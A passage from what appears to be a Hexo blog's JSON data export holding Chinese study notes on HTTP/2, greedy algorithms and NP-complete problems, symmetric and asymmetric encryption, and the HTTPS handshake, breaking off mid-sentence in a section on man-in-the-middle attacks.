学习篇](https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn)\n","slug":"study-http2","published":1,"updated":"2018-05-23T03:57:40.719Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r1002u0iofo2rwmf1w","content":"<h1 id=\"HTTP-1-0-的通信\"><a href=\"#HTTP-1-0-的通信\" class=\"headerlink\" title=\"HTTP/1.0 的通信\"></a>HTTP/1.0 的通信</h1><ul>\n<li>每完成一次请求和响应，TCP 连接就会断开。</li>\n</ul>\n<h1 id=\"HTTP-1-1-的通信\"><a href=\"#HTTP-1-1-的通信\" class=\"headerlink\" title=\"HTTP/1.1 的通信\"></a>HTTP/1.1 的通信</h1><ul>\n<li>TCP 连接有 RTT（Round Trip Time，就是往返时延的），每次请求一个资源就要有一次 RTT，用户可是等不得这种慢节奏的响应。</li>\n<li>到了 1.1，tcp 可以持久连接了，请求同域名下的 n 个资源，可以节约(n-1)*rtt 的时间</li>\n<li>http 管道技术虽然实现了客户端向服务器并行发送多个请求，但是 1.1 有严格的串行返回机制（前一个响应没有完成，下一个响应就不能返回），如果第一个响应时间很长，那么后面的响应处理完了也没法发送，只能被缓存起来，占用服务器内存。</li>\n</ul>\n<h1 id=\"SPDY\"><a href=\"#SPDY\" class=\"headerlink\" title=\"SPDY\"></a>SPDY</h1><ul>\n<li>谷歌推出的传输协议，最终演变成 HTTP/2</li>\n</ul>\n<h1 id=\"HTTP-2-0\"><a href=\"#HTTP-2-0\" class=\"headerlink\" title=\"HTTP/2.0\"></a>HTTP/2.0</h1><blockquote>\n<p>二进制分帧层，多向请求与响应，优先级与依赖性，首部压缩，服务器推送</p>\n</blockquote>\n<h2 id=\"二进制分帧层\"><a href=\"#二进制分帧层\" class=\"headerlink\" title=\"二进制分帧层\"></a>二进制分帧层</h2><ul>\n<li>tcp 连接在客户端和服务器间建立了一条运输的通道，可以双向通信</li>\n<li>当一端要向另一端发送消息的时候，把这个拆成几部分（帧），然后通过发起一个流来对这些帧进行发送，最后在另一端将同一个流的帧组合</li>\n<li>就好比搬家，先把桌子拆成零件，再通过几次的搬运，到了新家，再把桌子重新拼装起来</li>\n</ul>\n<h2 id=\"多向请求与响应（多路复用）\"><a href=\"#多向请求与响应（多路复用）\" class=\"headerlink\" title=\"多向请求与响应（多路复用）\"></a>多向请求与响应（多路复用）</h2><ul>\n<li>一端发送消息会先对消息进行拆分，与此同时，也会给同一个消息拆分出来的帧带上一个编号（stream ID），这样另一端接受这些帧后就可以根据编号进行组合</li>\n</ul>\n<h2 id=\"优先级和依赖性\"><a href=\"#优先级和依赖性\" class=\"headerlink\" title=\"优先级和依赖性\"></a>优先级和依赖性</h2><ul>\n<li>流可以有一个优先级属性</li>\n</ul>\n<h2 id=\"首部压缩\"><a href=\"#首部压缩\" class=\"headerlink\" title=\"首部压缩\"></a>首部压缩</h2><ul>\n<li>在客户端和服务器各自维护一个首部表，表中用索引代表首部名，上一次发送，两端都会记住已发送哪些首部，下一次传输只用传输差异的数据，相同的数据直接用索引表示即可。</li>\n</ul>\n<h2 id=\"服务器推送\"><a href=\"#服务器推送\" class=\"headerlink\" title=\"服务器推送\"></a>服务器推送</h2><ul>\n<li>服务器可以对一个客户端请求发送多个响应，也就是说，除了对最初请求的响应外，服务器还可以额外向客户端推送资源</li>\n</ul>\n<blockquote>\n<p>由上可得 http/2</p>\n</blockquote>\n<ul>\n<li>通过二进制分帧和多路复用机制，有效解决了 1.x 下请求/响应延迟的问题</li>\n<li>新的首部压缩技术使得 1.x 首部信息臃肿的问题得到解决</li>\n<li>优先级和依赖性与服务器推送使得我们可以更有效地利用好这个单一的 tcp 连接</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://aotu.io/notes/2016/03/17/http2-char/\" target=\"_blank\" rel=\"noopener\">http/2 安利篇(一)</a></li>\n<li><a href=\"https://aotu.io/notes/2016/06/14/http2/index.html\" target=\"_blank\" rel=\"noopener\">http/2 优化篇(二)</a></li>\n<li><a href=\"https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn\" target=\"_blank\" rel=\"noopener\">谷歌的 http2 学习篇</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTP-1-0-的通信\"><a href=\"#HTTP-1-0-的通信\" class=\"headerlink\" title=\"HTTP/1.0 的通信\"></a>HTTP/1.0 的通信</h1><ul>\n<li>每完成一次请求和响应，TCP 连接就会断开。</li>\n</ul>\n<h1 id=\"HTTP-1-1-的通信\"><a href=\"#HTTP-1-1-的通信\" class=\"headerlink\" title=\"HTTP/1.1 的通信\"></a>HTTP/1.1 的通信</h1><ul>\n<li>TCP 连接有 RTT（Round Trip Time，就是往返时延的），每次请求一个资源就要有一次 RTT，用户可是等不得这种慢节奏的响应。</li>\n<li>到了 1.1，tcp 可以持久连接了，请求同域名下的 n 个资源，可以节约(n-1)*rtt 的时间</li>\n<li>http 管道技术虽然实现了客户端向服务器并行发送多个请求，但是 1.1 有严格的串行返回机制（前一个响应没有完成，下一个响应就不能返回），如果第一个响应时间很长，那么后面的响应处理完了也没法发送，只能被缓存起来，占用服务器内存。</li>\n</ul>\n<h1 id=\"SPDY\"><a href=\"#SPDY\" class=\"headerlink\" title=\"SPDY\"></a>SPDY</h1><ul>\n<li>谷歌推出的传输协议，最终演变成 HTTP/2</li>\n</ul>\n<h1 id=\"HTTP-2-0\"><a href=\"#HTTP-2-0\" class=\"headerlink\" title=\"HTTP/2.0\"></a>HTTP/2.0</h1><blockquote>\n<p>二进制分帧层，多向请求与响应，优先级与依赖性，首部压缩，服务器推送</p>\n</blockquote>\n<h2 id=\"二进制分帧层\"><a href=\"#二进制分帧层\" class=\"headerlink\" title=\"二进制分帧层\"></a>二进制分帧层</h2><ul>\n<li>tcp 连接在客户端和服务器间建立了一条运输的通道，可以双向通信</li>\n<li>当一端要向另一端发送消息的时候，把这个拆成几部分（帧），然后通过发起一个流来对这些帧进行发送，最后在另一端将同一个流的帧组合</li>\n<li>就好比搬家，先把桌子拆成零件，再通过几次的搬运，到了新家，再把桌子重新拼装起来</li>\n</ul>\n<h2 id=\"多向请求与响应（多路复用）\"><a href=\"#多向请求与响应（多路复用）\" class=\"headerlink\" title=\"多向请求与响应（多路复用）\"></a>多向请求与响应（多路复用）</h2><ul>\n<li>一端发送消息会先对消息进行拆分，与此同时，也会给同一个消息拆分出来的帧带上一个编号（stream ID），这样另一端接受这些帧后就可以根据编号进行组合</li>\n</ul>\n<h2 id=\"优先级和依赖性\"><a href=\"#优先级和依赖性\" class=\"headerlink\" title=\"优先级和依赖性\"></a>优先级和依赖性</h2><ul>\n<li>流可以有一个优先级属性</li>\n</ul>\n<h2 id=\"首部压缩\"><a href=\"#首部压缩\" class=\"headerlink\" title=\"首部压缩\"></a>首部压缩</h2><ul>\n<li>在客户端和服务器各自维护一个首部表，表中用索引代表首部名，上一次发送，两端都会记住已发送哪些首部，下一次传输只用传输差异的数据，相同的数据直接用索引表示即可。</li>\n</ul>\n<h2 id=\"服务器推送\"><a href=\"#服务器推送\" class=\"headerlink\" title=\"服务器推送\"></a>服务器推送</h2><ul>\n<li>服务器可以对一个客户端请求发送多个响应，也就是说，除了对最初请求的响应外，服务器还可以额外向客户端推送资源</li>\n</ul>\n<blockquote>\n<p>由上可得 http/2</p>\n</blockquote>\n<ul>\n<li>通过二进制分帧和多路复用机制，有效解决了 1.x 下请求/响应延迟的问题</li>\n<li>新的首部压缩技术使得 1.x 首部信息臃肿的问题得到解决</li>\n<li>优先级和依赖性与服务器推送使得我们可以更有效地利用好这个单一的 tcp 连接</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://aotu.io/notes/2016/03/17/http2-char/\" target=\"_blank\" rel=\"noopener\">http/2 安利篇(一)</a></li>\n<li><a href=\"https://aotu.io/notes/2016/06/14/http2/index.html\" target=\"_blank\" rel=\"noopener\">http/2 优化篇(二)</a></li>\n<li><a href=\"https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn\" target=\"_blank\" rel=\"noopener\">谷歌的 http2 学习篇</a></li>\n</ul>\n"},{"title":"读《图解算法》07-贪婪算法","date":"2018-05-31T03:45:47.000Z","_content":"\n# 教室调度问题\n\n## 场景\n\n* 假设有五节课，从早上九点开始，每节课上一个小时，上到 12 点\n* 如何将尽可能多的课程安排在同一个教室\n\n## 解法\n\n* 看起来很难，实际上很简单\n* 找出结束最早的课，它就是这个教室里面上的第一节课\n* 接下来，必须选择第一节课后开始的课。同样我们选择结束最早的课\n* 重复上述步骤\n* 所以贪婪算法就是每一步都采取最优解，最终得到的就是全局最优解\n* 但是贪婪算法并不总是完美的，请看背包问题\n\n# 背包问题\n\n## 场景\n\n* 假设你是个贪婪的小偷，背着可装 35 磅的背包，去商场偷东西\n* 共三样，音响 300 美元 30 磅重，电脑 200 美元 20 磅重，吉他 150 美元 15 磅重\n* 如果按照贪婪算法，那么第一步就装了个音响就不能继续了\n\n# NP 完全问题\n\n> 需要计算所有的解，并从中选出最短的那个\n\n* 还没有找到快速解决的方法，只能用近似算法\n\n## 定义\n\n* 以难解著称的问题\n  * 旅行商问题\n  * 集合覆盖\n\n## 近似算法\n\n* 因为旅行商问题，5 个城市就是 5 的阶乘，一旦城市数量多了，根本不可能快速解出来\n* 于是有人就想到了近似算法\n* 随便选择出发的城市，然后每次选择下次要去的城市的时候\n* 都选择最近的那个\n\n## 如何识别 NP 完全问题\n\n### 场景\n\n* 你正在为篮球队挑选队员，需要优秀的后卫，高高的前锋。。。\n* 手里有一个名单，其中每个球员都符合某些要求\n* 从这些名单里选出来\n* 这就是一个集合覆盖的问题\n* 可以使用近似算法\n  * 找出符合要求最多的\n  * 重复上面，直到满了\n\n### 关键\n\n* 不能将问题分解成小问题的\n* 涉及所有组合的\n* 如果问题可以转换成集合覆盖或者旅行商问题\n* 想想旅行商问题和广度优先搜索的最短路径，后面是从 a 点到 b 点的，前者是经由指定点的就是 NP 完全问题\n","source":"_posts/study-greedy.md","raw":"---\ntitle: 读《图解算法》07-贪婪算法\ndate: 2018-05-31 11:45:47\ntags: 图解算法\n---\n\n# 教室调度问题\n\n## 场景\n\n* 假设有五节课，从早上九点开始，每节课上一个小时，上到 12 点\n* 如何将尽可能多的课程安排在同一个教室\n\n## 解法\n\n* 看起来很难，实际上很简单\n* 找出结束最早的课，它就是这个教室里面上的第一节课\n* 接下来，必须选择第一节课后开始的课。同样我们选择结束最早的课\n* 重复上述步骤\n* 所以贪婪算法就是每一步都采取最优解，最终得到的就是全局最优解\n* 但是贪婪算法并不总是完美的，请看背包问题\n\n# 背包问题\n\n## 场景\n\n* 假设你是个贪婪的小偷，背着可装 35 磅的背包，去商场偷东西\n* 共三样，音响 300 美元 30 磅重，电脑 200 美元 20 磅重，吉他 150 美元 15 磅重\n* 如果按照贪婪算法，那么第一步就装了个音响就不能继续了\n\n# NP 完全问题\n\n> 需要计算所有的解，并从中选出最短的那个\n\n* 还没有找到快速解决的方法，只能用近似算法\n\n## 定义\n\n* 以难解著称的问题\n  * 旅行商问题\n  * 集合覆盖\n\n## 近似算法\n\n* 因为旅行商问题，5 个城市就是 5 的阶乘，一旦城市数量多了，根本不可能快速解出来\n* 于是有人就想到了近似算法\n* 随便选择出发的城市，然后每次选择下次要去的城市的时候\n* 都选择最近的那个\n\n## 如何识别 NP 完全问题\n\n### 场景\n\n* 你正在为篮球队挑选队员，需要优秀的后卫，高高的前锋。。。\n* 手里有一个名单，其中每个球员都符合某些要求\n* 从这些名单里选出来\n* 这就是一个集合覆盖的问题\n* 可以使用近似算法\n  * 找出符合要求最多的\n  * 重复上面，直到满了\n\n### 关键\n\n* 不能将问题分解成小问题的\n* 涉及所有组合的\n* 如果问题可以转换成集合覆盖或者旅行商问题\n* 想想旅行商问题和广度优先搜索的最短路径，后面是从 a 点到 b 点的，前者是经由指定点的就是 NP 完全问题\n","slug":"study-greedy","published":1,"updated":"2018-05-31T13:25:22.539Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r2002x0iofra5f8vrk","content":"<h1 id=\"教室调度问题\"><a href=\"#教室调度问题\" class=\"headerlink\" title=\"教室调度问题\"></a>教室调度问题</h1><h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><ul>\n<li>假设有五节课，从早上九点开始，每节课上一个小时，上到 12 点</li>\n<li>如何将尽可能多的课程安排在同一个教室</li>\n</ul>\n<h2 id=\"解法\"><a href=\"#解法\" class=\"headerlink\" title=\"解法\"></a>解法</h2><ul>\n<li>看起来很难，实际上很简单</li>\n<li>找出结束最早的课，它就是这个教室里面上的第一节课</li>\n<li>接下来，必须选择第一节课后开始的课。同样我们选择结束最早的课</li>\n<li>重复上述步骤</li>\n<li>所以贪婪算法就是每一步都采取最优解，最终得到的就是全局最优解</li>\n<li>但是贪婪算法并不总是完美的，请看背包问题</li>\n</ul>\n<h1 id=\"背包问题\"><a href=\"#背包问题\" class=\"headerlink\" title=\"背包问题\"></a>背包问题</h1><h2 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景\"></a>场景</h2><ul>\n<li>假设你是个贪婪的小偷，背着可装 35 磅的背包，去商场偷东西</li>\n<li>共三样，音响 300 美元 30 磅重，电脑 200 美元 20 磅重，吉他 150 美元 15 磅重</li>\n<li>如果按照贪婪算法，那么第一步就装了个音响就不能继续了</li>\n</ul>\n<h1 id=\"NP-完全问题\"><a href=\"#NP-完全问题\" class=\"headerlink\" title=\"NP 完全问题\"></a>NP 完全问题</h1><blockquote>\n<p>需要计算所有的解，并从中选出最短的那个</p>\n</blockquote>\n<ul>\n<li>还没有找到快速解决的方法，只能用近似算法</li>\n</ul>\n<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><ul>\n<li>以难解著称的问题<ul>\n<li>旅行商问题</li>\n<li>集合覆盖</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"近似算法\"><a href=\"#近似算法\" class=\"headerlink\" title=\"近似算法\"></a>近似算法</h2><ul>\n<li>因为旅行商问题，5 个城市就是 5 的阶乘，一旦城市数量多了，根本不可能快速解出来</li>\n<li>于是有人就想到了近似算法</li>\n<li>随便选择出发的城市，然后每次选择下次要去的城市的时候</li>\n<li>都选择最近的那个</li>\n</ul>\n<h2 id=\"如何识别-NP-完全问题\"><a href=\"#如何识别-NP-完全问题\" class=\"headerlink\" title=\"如何识别 NP 完全问题\"></a>如何识别 NP 完全问题</h2><h3 id=\"场景-2\"><a href=\"#场景-2\" class=\"headerlink\" title=\"场景\"></a>场景</h3><ul>\n<li>你正在为篮球队挑选队员，需要优秀的后卫，高高的前锋。。。</li>\n<li>手里有一个名单，其中每个球员都符合某些要求</li>\n<li>从这些名单里选出来</li>\n<li>这就是一个集合覆盖的问题</li>\n<li>可以使用近似算法<ul>\n<li>找出符合要求最多的</li>\n<li>重复上面，直到满了</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关键\"><a href=\"#关键\" class=\"headerlink\" title=\"关键\"></a>关键</h3><ul>\n<li>不能将问题分解成小问题的</li>\n<li>涉及所有组合的</li>\n<li>如果问题可以转换成集合覆盖或者旅行商问题</li>\n<li>想想旅行商问题和广度优先搜索的最短路径，后面是从 a 点到 b 点的，前者是经由指定点的就是 NP 完全问题</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"教室调度问题\"><a href=\"#教室调度问题\" class=\"headerlink\" title=\"教室调度问题\"></a>教室调度问题</h1><h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><ul>\n<li>假设有五节课，从早上九点开始，每节课上一个小时，上到 12 点</li>\n<li>如何将尽可能多的课程安排在同一个教室</li>\n</ul>\n<h2 id=\"解法\"><a href=\"#解法\" class=\"headerlink\" title=\"解法\"></a>解法</h2><ul>\n<li>看起来很难，实际上很简单</li>\n<li>找出结束最早的课，它就是这个教室里面上的第一节课</li>\n<li>接下来，必须选择第一节课后开始的课。同样我们选择结束最早的课</li>\n<li>重复上述步骤</li>\n<li>所以贪婪算法就是每一步都采取最优解，最终得到的就是全局最优解</li>\n<li>但是贪婪算法并不总是完美的，请看背包问题</li>\n</ul>\n<h1 id=\"背包问题\"><a href=\"#背包问题\" class=\"headerlink\" title=\"背包问题\"></a>背包问题</h1><h2 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景\"></a>场景</h2><ul>\n<li>假设你是个贪婪的小偷，背着可装 35 磅的背包，去商场偷东西</li>\n<li>共三样，音响 300 美元 30 磅重，电脑 200 美元 20 磅重，吉他 150 美元 15 磅重</li>\n<li>如果按照贪婪算法，那么第一步就装了个音响就不能继续了</li>\n</ul>\n<h1 id=\"NP-完全问题\"><a href=\"#NP-完全问题\" class=\"headerlink\" title=\"NP 完全问题\"></a>NP 完全问题</h1><blockquote>\n<p>需要计算所有的解，并从中选出最短的那个</p>\n</blockquote>\n<ul>\n<li>还没有找到快速解决的方法，只能用近似算法</li>\n</ul>\n<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><ul>\n<li>以难解著称的问题<ul>\n<li>旅行商问题</li>\n<li>集合覆盖</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"近似算法\"><a href=\"#近似算法\" class=\"headerlink\" title=\"近似算法\"></a>近似算法</h2><ul>\n<li>因为旅行商问题，5 个城市就是 5 的阶乘，一旦城市数量多了，根本不可能快速解出来</li>\n<li>于是有人就想到了近似算法</li>\n<li>随便选择出发的城市，然后每次选择下次要去的城市的时候</li>\n<li>都选择最近的那个</li>\n</ul>\n<h2 id=\"如何识别-NP-完全问题\"><a href=\"#如何识别-NP-完全问题\" class=\"headerlink\" title=\"如何识别 NP 完全问题\"></a>如何识别 NP 完全问题</h2><h3 id=\"场景-2\"><a href=\"#场景-2\" class=\"headerlink\" title=\"场景\"></a>场景</h3><ul>\n<li>你正在为篮球队挑选队员，需要优秀的后卫，高高的前锋。。。</li>\n<li>手里有一个名单，其中每个球员都符合某些要求</li>\n<li>从这些名单里选出来</li>\n<li>这就是一个集合覆盖的问题</li>\n<li>可以使用近似算法<ul>\n<li>找出符合要求最多的</li>\n<li>重复上面，直到满了</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关键\"><a href=\"#关键\" class=\"headerlink\" title=\"关键\"></a>关键</h3><ul>\n<li>不能将问题分解成小问题的</li>\n<li>涉及所有组合的</li>\n<li>如果问题可以转换成集合覆盖或者旅行商问题</li>\n<li>想想旅行商问题和广度优先搜索的最短路径，后面是从 a 点到 b 点的，前者是经由指定点的就是 NP 完全问题</li>\n</ul>\n"},{"title":"加密传输之加密方式","date":"2018-05-13T10:11:12.000Z","_content":"\n## 加密传输方式\n\n* 主要有两种，一种是对称加密（想想 shadowsocks），另外一种是非对称加密\n\n### 对称加密\n\n> 对称加密算法在加密和解密的时候用的是同一个秘钥\n\n对称加密模式：\n\n* 甲方选择某一种加密规则，对信息进行加密\n* 乙方使用同一种规则，对信息进行解密\n\n客户端和服务端进行通信，采用对称加密，如果只用一个秘钥，很容易破解；如果每次用不同的，海量秘钥的管理和传输成本又比较高，所以可以采用非对称加密。\n\n### 非对称加密\n\n> 需要两个密钥，一个是公钥，一个是私钥\n\n非对称加密模式：\n\n* 乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。\n* 甲方获得乙方的公钥后，用它对信息进行加密\n* 乙方拿到加密后的数据后，用私钥进行解密\n\n即使黑客拿到了公钥，没有私钥也是没有办法解密，不考虑彩虹表的情况下，完全可以长期使用一对私钥\n\n#### 什么是彩虹表\n\n彩虹表是一个用于加密散列函数逆运算的预先计算好的表，常用于破解加密过的密码散列。 查找表常常用于包含有限字符固定长度纯文本密码的加密。这是以空间换时间的典型实践，在每一次尝试都计算的暴力破解中使用更少的计算能力和更多的储存空间，但却比简单的每个输入一条散列的翻查表使用更少的储存空间和更多的计算性能。\n\n#### RSA 算法\n\n最经典的非对称加密算法是 RSA\n\n> RSA 公钥加密算法是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。公钥私钥成对出现，用其中一个加密只能用另一个解密，通常用公钥加密私钥解密。\n","source":"_posts/study-https-01.md","raw":"---\ntitle: 加密传输之加密方式\ndate: 2018-05-13 18:11:12\ntags: 浏览器\n---\n\n## 加密传输方式\n\n* 主要有两种，一种是对称加密（想想 shadowsocks），另外一种是非对称加密\n\n### 对称加密\n\n> 对称加密算法在加密和解密的时候用的是同一个秘钥\n\n对称加密模式：\n\n* 甲方选择某一种加密规则，对信息进行加密\n* 乙方使用同一种规则，对信息进行解密\n\n客户端和服务端进行通信，采用对称加密，如果只用一个秘钥，很容易破解；如果每次用不同的，海量秘钥的管理和传输成本又比较高，所以可以采用非对称加密。\n\n### 非对称加密\n\n> 需要两个密钥，一个是公钥，一个是私钥\n\n非对称加密模式：\n\n* 乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。\n* 甲方获得乙方的公钥后，用它对信息进行加密\n* 乙方拿到加密后的数据后，用私钥进行解密\n\n即使黑客拿到了公钥，没有私钥也是没有办法解密，不考虑彩虹表的情况下，完全可以长期使用一对私钥\n\n#### 什么是彩虹表\n\n彩虹表是一个用于加密散列函数逆运算的预先计算好的表，常用于破解加密过的密码散列。 查找表常常用于包含有限字符固定长度纯文本密码的加密。这是以空间换时间的典型实践，在每一次尝试都计算的暴力破解中使用更少的计算能力和更多的储存空间，但却比简单的每个输入一条散列的翻查表使用更少的储存空间和更多的计算性能。\n\n#### RSA 算法\n\n最经典的非对称加密算法是 RSA\n\n> RSA 公钥加密算法是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。公钥私钥成对出现，用其中一个加密只能用另一个解密，通常用公钥加密私钥解密。\n","slug":"study-https-01","published":1,"updated":"2018-05-13T11:23:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r3002y0ioffe6h4fgn","content":"<h2 id=\"加密传输方式\"><a href=\"#加密传输方式\" class=\"headerlink\" title=\"加密传输方式\"></a>加密传输方式</h2><ul>\n<li>主要有两种，一种是对称加密（想想 shadowsocks），另外一种是非对称加密</li>\n</ul>\n<h3 id=\"对称加密\"><a href=\"#对称加密\" class=\"headerlink\" title=\"对称加密\"></a>对称加密</h3><blockquote>\n<p>对称加密算法在加密和解密的时候用的是同一个秘钥</p>\n</blockquote>\n<p>对称加密模式：</p>\n<ul>\n<li>甲方选择某一种加密规则，对信息进行加密</li>\n<li>乙方使用同一种规则，对信息进行解密</li>\n</ul>\n<p>客户端和服务端进行通信，采用对称加密，如果只用一个秘钥，很容易破解；如果每次用不同的，海量秘钥的管理和传输成本又比较高，所以可以采用非对称加密。</p>\n<h3 id=\"非对称加密\"><a href=\"#非对称加密\" class=\"headerlink\" title=\"非对称加密\"></a>非对称加密</h3><blockquote>\n<p>需要两个密钥，一个是公钥，一个是私钥</p>\n</blockquote>\n<p>非对称加密模式：</p>\n<ul>\n<li>乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。</li>\n<li>甲方获得乙方的公钥后，用它对信息进行加密</li>\n<li>乙方拿到加密后的数据后，用私钥进行解密</li>\n</ul>\n<p>即使黑客拿到了公钥，没有私钥也是没有办法解密，不考虑彩虹表的情况下，完全可以长期使用一对私钥</p>\n<h4 id=\"什么是彩虹表\"><a href=\"#什么是彩虹表\" class=\"headerlink\" title=\"什么是彩虹表\"></a>什么是彩虹表</h4><p>彩虹表是一个用于加密散列函数逆运算的预先计算好的表，常用于破解加密过的密码散列。 查找表常常用于包含有限字符固定长度纯文本密码的加密。这是以空间换时间的典型实践，在每一次尝试都计算的暴力破解中使用更少的计算能力和更多的储存空间，但却比简单的每个输入一条散列的翻查表使用更少的储存空间和更多的计算性能。</p>\n<h4 id=\"RSA-算法\"><a href=\"#RSA-算法\" class=\"headerlink\" title=\"RSA 算法\"></a>RSA 算法</h4><p>最经典的非对称加密算法是 RSA</p>\n<blockquote>\n<p>RSA 公钥加密算法是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。公钥私钥成对出现，用其中一个加密只能用另一个解密，通常用公钥加密私钥解密。</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"加密传输方式\"><a href=\"#加密传输方式\" class=\"headerlink\" title=\"加密传输方式\"></a>加密传输方式</h2><ul>\n<li>主要有两种，一种是对称加密（想想 shadowsocks），另外一种是非对称加密</li>\n</ul>\n<h3 id=\"对称加密\"><a href=\"#对称加密\" class=\"headerlink\" title=\"对称加密\"></a>对称加密</h3><blockquote>\n<p>对称加密算法在加密和解密的时候用的是同一个秘钥</p>\n</blockquote>\n<p>对称加密模式：</p>\n<ul>\n<li>甲方选择某一种加密规则，对信息进行加密</li>\n<li>乙方使用同一种规则，对信息进行解密</li>\n</ul>\n<p>客户端和服务端进行通信，采用对称加密，如果只用一个秘钥，很容易破解；如果每次用不同的，海量秘钥的管理和传输成本又比较高，所以可以采用非对称加密。</p>\n<h3 id=\"非对称加密\"><a href=\"#非对称加密\" class=\"headerlink\" title=\"非对称加密\"></a>非对称加密</h3><blockquote>\n<p>需要两个密钥，一个是公钥，一个是私钥</p>\n</blockquote>\n<p>非对称加密模式：</p>\n<ul>\n<li>乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。</li>\n<li>甲方获得乙方的公钥后，用它对信息进行加密</li>\n<li>乙方拿到加密后的数据后，用私钥进行解密</li>\n</ul>\n<p>即使黑客拿到了公钥，没有私钥也是没有办法解密，不考虑彩虹表的情况下，完全可以长期使用一对私钥</p>\n<h4 id=\"什么是彩虹表\"><a href=\"#什么是彩虹表\" class=\"headerlink\" title=\"什么是彩虹表\"></a>什么是彩虹表</h4><p>彩虹表是一个用于加密散列函数逆运算的预先计算好的表，常用于破解加密过的密码散列。 查找表常常用于包含有限字符固定长度纯文本密码的加密。这是以空间换时间的典型实践，在每一次尝试都计算的暴力破解中使用更少的计算能力和更多的储存空间，但却比简单的每个输入一条散列的翻查表使用更少的储存空间和更多的计算性能。</p>\n<h4 id=\"RSA-算法\"><a href=\"#RSA-算法\" class=\"headerlink\" title=\"RSA 算法\"></a>RSA 算法</h4><p>最经典的非对称加密算法是 RSA</p>\n<blockquote>\n<p>RSA 公钥加密算法是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。公钥私钥成对出现，用其中一个加密只能用另一个解密，通常用公钥加密私钥解密。</p>\n</blockquote>\n"},{"title":"加密传输之HTTPS","date":"2018-05-13T11:24:11.000Z","_content":"\n## http 和 https\n\n常规的 http 请求，所有信息明文传播，只要中间人在链路中的任意阶段进行劫持，就会带来三大风险：\n\n* 窃听风险：第三方可以获取通信内容\n* 篡改风险：第三方可以修改通信内容\n* 冒充风险：第三方可以冒充他人身份参与通信\n\nhttps 可以解决这些问题\n\n### https\n\n> http+TLS，TLS 是传输层加密协议，前身是 SSL 协议（1999 年应用广泛，然后标准化，改名就是 TLS，所以同一个东西的不同阶段）\n\nSSL/TLS 协议是为了解决 http 的三大风险而设计的，希望达到：\n\n* 内容加密：所有信息不再明文传播，都是加密的，第三方无法窃听\n* 数据完整性：防止内容被第三方冒充或者篡改。具有校验机制，一旦被篡改，通信双方会立刻发现。\n* 身份认证：配备身份证书，防止身份被冒充。即使被 DNS 劫持到了第三方站点，也会提醒用户有可能被劫持。\n\n#### DNS 劫持\n\n> 又叫域名劫持\n\n* 是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名\n\n[深入理解 http 请求，dns 劫持与解析](https://juejin.im/post/59ba146c6fb9a00a4636d8b6)\n[dns 劫持和 http 劫持的区别](https://www.zhihu.com/question/27035513)\n\n## https 流程\n\n* 客户端发起 https 请求\n* 服务端的配置\n  * 一般需要向权威机构申请一个证书（也可以自己制作，这个会在之后的中间人攻击中讲到，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会提示），证书会生成 RSA 加密使用的一对公钥 A 和私钥 B\n* 传送证书\n  * 这个证书主要内容是公钥 A，也包含了其他信息，如证书的颁发机构，过期时间等等\n* 客户端解析证书\n  * 由客户端的 TLS 来完成的，主要是验证公钥 A 是否有效，比如颁发机构，过期时间等等，如果发现异常就会弹出一个警告框，提示证书有问题\n  * 如果证书没有问题，那么就生成一个随机值（秘钥 D）。之后就进入了不对称加密（RSA）的过程，用证书对该随机值加密（秘钥 D），生成私钥 C\n* 传送加密信息\n  * 这部分传送的是用证书加密后的随机值（私钥 C）\n* 服务端解密信息\n  * 服务端私钥 B 解密私钥 C 后，得到客户端传过来的秘钥 D，到此 RSA 非对称加密的过程结束，后续所有的数据都可以用私钥 D，进行对称加密和解密\n* 传输加密后的信息\n  * 服务端用秘钥 D 加密信息\n* 客户端解密信息\n  * 客户端用之前生成的私钥 D 解密服务端传过来的信息，于是获取到了解密后的内容\n\n## 中间人攻击\n\n> https 信息的安全完全建立在证书可信的基础上，如果中间人伪造证书怎么办？\n\n* 黑客自己伪造的证书需要通过客户端验证通过，才可以继续访问，只要客户端验证通过，那么公钥 A，私钥 